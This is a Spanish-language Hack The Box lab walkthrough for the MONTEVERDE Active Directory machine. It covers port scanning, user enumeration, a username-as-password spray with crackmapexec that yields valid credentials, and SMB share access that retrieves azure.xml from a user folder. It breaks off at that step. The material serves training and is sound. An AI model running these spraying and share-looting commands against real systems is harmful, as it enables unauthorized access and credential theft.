# MONTEVERDE-HTB

Desarrollo de la VM MONTEVERDE de HACK THE BOX (HTB)

## 1. Configuración de la VM

- La VM se encuentra en estado de retirada de HTB
- Se debe activar la VM para poder usarla, se requiere una suscripción PREMIUM.

## 2. Escaneo de Puertos

```
┌──(root㉿kali)-[~/HT/MONTEVERDE]
└─# nmap -n -P0 -sS -sC -vv -oA full 10.129.127.11 
Warning: The -P0 option is deprecated. Please use -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-01 13:05 EDT
NSE: Loaded 125 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
Initiating SYN Stealth Scan at 13:05
Scanning 10.129.127.11 [1000 ports]
Discovered open port 135/tcp on 10.129.127.11
Discovered open port 445/tcp on 10.129.127.11
Discovered open port 139/tcp on 10.129.127.11
Discovered open port 53/tcp on 10.129.127.11
Discovered open port 3269/tcp on 10.129.127.11
Discovered open port 389/tcp on 10.129.127.11
Discovered open port 464/tcp on 10.129.127.11
Discovered open port 593/tcp on 10.129.127.11
Discovered open port 3268/tcp on 10.129.127.11
Discovered open port 88/tcp on 10.129.127.11
Discovered open port 636/tcp on 10.129.127.11
Completed SYN Stealth Scan at 13:05, 20.06s elapsed (1000 total ports)
NSE: Script scanning 10.129.127.11.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:05
NSE Timing: About 96.44% done; ETC: 13:06 (0:00:01 remaining)
Completed NSE at 13:06, 42.05s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:06
Completed NSE at 13:06, 0.00s elapsed
Nmap scan report for 10.129.127.11
Host is up, received user-set (0.29s latency).
Scanned at 2022-04-01 13:05:38 EDT for 62s
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack ttl 127
88/tcp   open  kerberos-sec     syn-ack ttl 127
135/tcp  open  msrpc            syn-ack ttl 127
139/tcp  open  netbios-ssn      syn-ack ttl 127
389/tcp  open  ldap             syn-ack ttl 127
445/tcp  open  microsoft-ds     syn-ack ttl 127
464/tcp  open  kpasswd5         syn-ack ttl 127
593/tcp  open  http-rpc-epmap   syn-ack ttl 127
636/tcp  open  ldapssl          syn-ack ttl 127
3268/tcp open  globalcatLDAP    syn-ack ttl 127
3269/tcp open  globalcatLDAPssl syn-ack ttl 127

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 24710/tcp): CLEAN (Timeout)
|   Check 2 (port 58125/tcp): CLEAN (Timeout)
|   Check 3 (port 23044/udp): CLEAN (Timeout)
|   Check 4 (port 59026/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
| smb2-time: 
|   date: 2022-04-01T17:06:03
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```

<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte1.jpg" width=80% />


## 3. Enumeración

- Podemos enumerar utilizando ENUM4LINUX o AUTORECON.

```
┌──(root㉿kali)-[~/HT/MONTEVERDE]
└─# enum4linux -a -M -l -d 10.129.127.11
```

- Se identifican usuarios de acceso al AD.

<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte2.jpg" width=80% />

```
dgalanos
mhope
roleary
SABatchJobs
smorgan
svc-ata
svc-bexec
svc-netapp
```

## 4. Explotación

### 4.1. Cracking ONLINE

- Realizamos un ataque de cracking con los usuarios identificados. Tenemos dos opciones:
* Todos los usuarios con el diccionario ROCKYOU (que demoraría mucho)
* Todos los usuarios con contraseñas muy débiles. Usuario = Contraseña

```
┌──(root㉿kali)-[~/HT/MONTEVERDE]
└─# crackmapexec smb 10.129.127.11 -u users.txt -p users.txt --shares --pass-pol           
SMB         10.129.127.11   445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:roleary STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:roleary STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:roleary STATUS_LOGON_FAILURE 
SMB         10.129.127.11   445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.127.11   445    MONTEVERDE       [+] Enumerated shares
SMB         10.129.127.11   445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.127.11   445    MONTEVERDE       -----           -----------     ------
SMB         10.129.127.11   445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.127.11   445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.127.11   445    MONTEVERDE       C$                              Default share
SMB         10.129.127.11   445    MONTEVERDE       E$                              Default share
SMB         10.129.127.11   445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.127.11   445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.127.11   445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.127.11   445    MONTEVERDE       users$          READ            
SMB         10.129.127.11   445    MONTEVERDE       [+] Dumping password info for domain: MEGABANK
SMB         10.129.127.11   445    MONTEVERDE       Minimum password length: 7
SMB         10.129.127.11   445    MONTEVERDE       Password history length: 24
SMB         10.129.127.11   445    MONTEVERDE       Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.129.127.11   445    MONTEVERDE       
SMB         10.129.127.11   445    MONTEVERDE       Password Complexity Flags: 000000
SMB         10.129.127.11   445    MONTEVERDE       	Domain Refuse Password Change: 0
SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Store Cleartext: 0
SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Lockout Admins: 0
SMB         10.129.127.11   445    MONTEVERDE       	Domain Password No Clear Change: 0
SMB         10.129.127.11   445    MONTEVERDE       	Domain Password No Anon Change: 0
SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Complex: 0
```

<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte3.jpg" width=80% />


### 4.2. Carpeta compartida

- Listamos las carpetas que tiene el usuario SABatchJobs
- El usuario tiene acceso a la carpeta USERS$

```
┌──(root㉿kali)-[~/HT/MONTEVERDE]
└─# smbmap -H 10.129.127.11 -u SABatchJobs -p 'SABatchJobs' -R
```

<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte4jpg" width=80% />

- Accedemos a la carpeta compartida y vemos el contenido del archvivo AZURE.XML

```
┌──(root㉿kali)-[~/HT/MONTEVERDE]
└─# smbclient \\\\10.129.127.11\\users$\\ -U SABatchJobs
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

		309503 blocks of size 4096. 303390 blocks available
smb: \> cd mhope
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

		309503 blocks of size 4096. 303390 blocks available
smb: \mhope\> get azure.xml
```

<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte5.jpg" width=80% />
































